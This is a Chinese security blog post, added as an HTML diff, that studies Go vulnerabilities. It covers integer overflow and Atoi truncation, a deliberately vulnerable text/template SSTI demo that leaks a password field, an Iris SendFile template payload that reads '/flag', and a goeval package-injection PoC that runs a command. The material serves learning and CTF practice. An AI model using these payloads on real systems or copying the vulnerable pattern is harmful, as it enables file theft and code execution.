@@ -1,0 +1,519 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>go漏洞学习 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#strconv-Atoi%E6%88%AA%E6%96%AD"><span class="toc-number">2.1.</span> <span class="toc-text">strconv.Atoi截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI"><span class="toc-number">3.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Iris%E6%A1%86%E6%9E%B6"><span class="toc-number">3.2.</span> <span class="toc-text">Iris框架</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#goeval%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">goeval命令注入</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>go漏洞学习</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/17
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Golang/" style="color: #ff7d73">Golang</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.2k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目前只学习了整数溢出和ssti</p>
+<p>参考博客：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.h4ck.fun/golang_vuln_share">https://blog.h4ck.fun/golang_vuln_share</a></p>
+<p><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>
+<p>Golang 是一门强类型的语言，在代码中不使用 cgo 的情况下默认使用静态编译，在编译过程中就能杜绝许多安全问题，因此 Golang 会出现的一些安全问题经常是因为依赖库中的issues和开发者自身操作不当</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><p>无符号整型溢出：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"fmt"</span>
+	<span class="token string">"reflect"</span>
+<span class="token punctuation">)</span>	
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">var</span> a <span class="token builtin">uint16</span> <span class="token operator">=</span> <span class="token number">65535</span>
+	<span class="token keyword">var</span> b <span class="token builtin">uint16</span> <span class="token operator">=</span> <span class="token number">1</span>
+	<span class="token keyword">var</span> c <span class="token builtin">uint16</span> <span class="token operator">=</span> <span class="token number">2</span>
+	<span class="token keyword">var</span> sum1 <span class="token operator">=</span> a <span class="token operator">+</span> b
+	<span class="token keyword">var</span> sum2 <span class="token operator">=</span> b <span class="token operator">-</span> c
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>sum1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum1<span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum2<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行得到</p>
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018170351727.png" alt="image-20231018170351727"></p>
+<p>因为uint16类型的范围为0~65535，对无符号数，65535向上溢出后会从0开始算溢出的部分，0向下溢出会从65535开始算溢出的部分</p>
+<p>如果定义时直接赋值一个大小已经溢出的数，编译器会编译不通过</p>
+<p>有符号数也是同理：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"fmt"</span>
+	<span class="token string">"reflect"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">var</span> a2 <span class="token builtin">int8</span> <span class="token operator">=</span> <span class="token number">127</span>
+	<span class="token keyword">var</span> b2 <span class="token builtin">int8</span> <span class="token operator">=</span> <span class="token number">1</span>
+	<span class="token keyword">var</span> sum1 <span class="token builtin">int8</span> <span class="token operator">=</span> a2 <span class="token operator">+</span> b2
+	<span class="token keyword">var</span> sum2 <span class="token builtin">int8</span> <span class="token operator">=</span> <span class="token operator">-</span>a2 <span class="token operator">-</span> b2 <span class="token operator">-</span> b2
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>sum1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum1<span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum2<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018171057653.png" alt="image-20231018171057653"></p>
+<p>int8的范围是-128~127，可以看到对127加1超出了int8的范围，翻转为了-128</p>
+<p>在类型转换中，也会出现较大整型向较小整型转换的截断问题，Golang 是一种强类型语言，但是 Golang 提供了类型强制转换的功能，来跳过该限制</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"fmt"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">var</span> a3 <span class="token builtin">int16</span> <span class="token operator">=</span> <span class="token number">255</span>
+	<span class="token keyword">var</span> b3 <span class="token operator">=</span> <span class="token function">int8</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b3<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018171432461.png" alt="image-20231018171432461"></p>
+<p>可以看到较大整型向较小整型转换会自动换算成溢出后的值</p>
+<h2 id="strconv-Atoi截断"><a href="#strconv-Atoi截断" class="headerlink" title="strconv.Atoi截断"></a>strconv.Atoi截断</h2><p>旧版本的<code>kubectl</code>命令行中出现了一个<code>strconv.Atoi</code>导致的截断问题。</p>
+<p>当我们传入port参数的对应字符串后,容器启动的端口这一参数会将经Atoi处理后的字符串进行int32的类型转换</p>
+<p>由于64位系统的int是int64类型。转int32的话会出现明显截断：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">v <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span><span class="token string">"4294967377"</span><span class="token punctuation">)</span>
+s  <span class="token operator">:=</span> <span class="token function">int32</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>
+fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+<span class="token comment">// 81</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样就有可能导致81端口的服务启动，或者被停止</p>
+<hr>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>Golang的<code>html/template</code>包提供模板渲染的功能，和flask的ssti一样，当源码中出现用户可控且直接拼接渲染时会出现模板注入的漏洞，轻则造成信息泄漏，严重的可能会出现rce等</p>
+<p><strong>识别方法</strong>：与其他SSTI识别方法不同，运算符在<code>&#123;&#123;&#125;&#125;</code>中是非法的，因此需要使用其他的payload，如<code>&#123;&#123;.&#125;&#125;</code>占位符，如果存在SSTI，那么应当无回显。当然，点替换为任意字符串也可以</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>demo：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"fmt"</span>
+	<span class="token string">"net/http"</span>
+	<span class="token string">"strings"</span>
+	<span class="token string">"text/template"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+	Id     <span class="token builtin">int</span>
+	Name   <span class="token builtin">string</span>
+	Passwd <span class="token builtin">string</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">StringTplExam</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	user <span class="token operator">:=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"noa"</span><span class="token punctuation">,</span> <span class="token string">"this_is_your_key"</span><span class="token punctuation">&#125;</span>
+	r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	arg <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+	tpl1 <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`&lt;h1>Hi, `</span> <span class="token operator">+</span> arg <span class="token operator">+</span> <span class="token string">`&lt;/h1> Your name is &#123;&#123; .Name &#125;&#125;`</span><span class="token punctuation">)</span>
+	html<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>tpl1<span class="token punctuation">)</span>
+	html <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">Must</span><span class="token punctuation">(</span>html<span class="token punctuation">,</span> err<span class="token punctuation">)</span>
+	html<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> user<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	server <span class="token operator">:=</span> http<span class="token punctuation">.</span>Server<span class="token punctuation">&#123;</span>
+		Addr<span class="token punctuation">:</span> <span class="token string">"127.0.0.1:8080"</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span>
+	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/string"</span><span class="token punctuation">,</span> StringTplExam<span class="token punctuation">)</span>
+	server<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行，访问&#x2F;string，就能看到被渲染好的页面</p>
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231110151308090.png" alt="image-20231110151308090"></p>
+<p>结构体是Go中一个非常重要的类型，Go通过结构体来类比一个对象，因此他的字段就是一个对象的属性</p>
+<p>通常Json的编码和解析都需要通过结构体来实现，加之模板渲染支持传入一个结构体的实例来渲染它的字段，这就造成了信息泄漏的可能</p>
+<p>如代码所示，name的值是我们可控的且直接拼接进模板</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">arg <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+tpl1 <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`&lt;h1>Hi, `</span> <span class="token operator">+</span> arg <span class="token operator">+</span> <span class="token string">`&lt;/h1> Your name is &#123;&#123; .Name &#125;&#125;`</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因此仿造<code>&#123;&#123;.Name&#125;&#125;</code>的结构构造<code>&#123;&#123;.Passwd&#125;&#125;</code>就能获得Passwd的字段值。</p>
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231110151458670.png" alt="image-20231110151458670"></p>
+<hr>
+<h2 id="Iris框架"><a href="#Iris框架" class="headerlink" title="Iris框架"></a>Iris框架</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/350580.html">https://www.freebuf.com/vuls/350580.html</a></p>
+<p>用户可以对日志的格式参数进行控制，而参数又会被当成模板渲染</p>
+<p>文档：<a target="_blank" rel="noopener" href="https://www.topgoer.cn/docs/lris//706">https://www.topgoer.cn/docs/lris//706</a></p>
+<p>在Context这里寻找可利用的方法</p>
+<p><img src="/blog/2023/10/17/go%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20240921001145742.png" alt="image-20240921001145742"></p>
+<p>SendFile可以强制下载文件</p>
+<p>所以payload：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">.</span>Ctx<span class="token punctuation">.</span>SendFile <span class="token string">"/flag"</span> <span class="token string">"1.txt"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="goeval命令注入"><a href="#goeval命令注入" class="headerlink" title="goeval命令注入"></a>goeval命令注入</h1><p>是第三方模块：<a target="_blank" rel="noopener" href="https://github.com/PaulXu-cn/goeval">https://github.com/PaulXu-cn/goeval</a></p>
+<p>存在package处命令注入的漏洞</p>
+<p>poc：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"fmt"</span>
+
+	<span class="token string">"github.com/PaulXu-cn/goeval"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+	Package <span class="token operator">:=</span> <span class="token string">"\"os/exec\"\n fmt\"\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\"calc\")\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\"1"</span>
+	eval<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> goeval<span class="token punctuation">.</span><span class="token function">Eval</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"fmt.Println(\"Good\")"</span><span class="token punctuation">,</span> Package<span class="token punctuation">)</span>
+	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
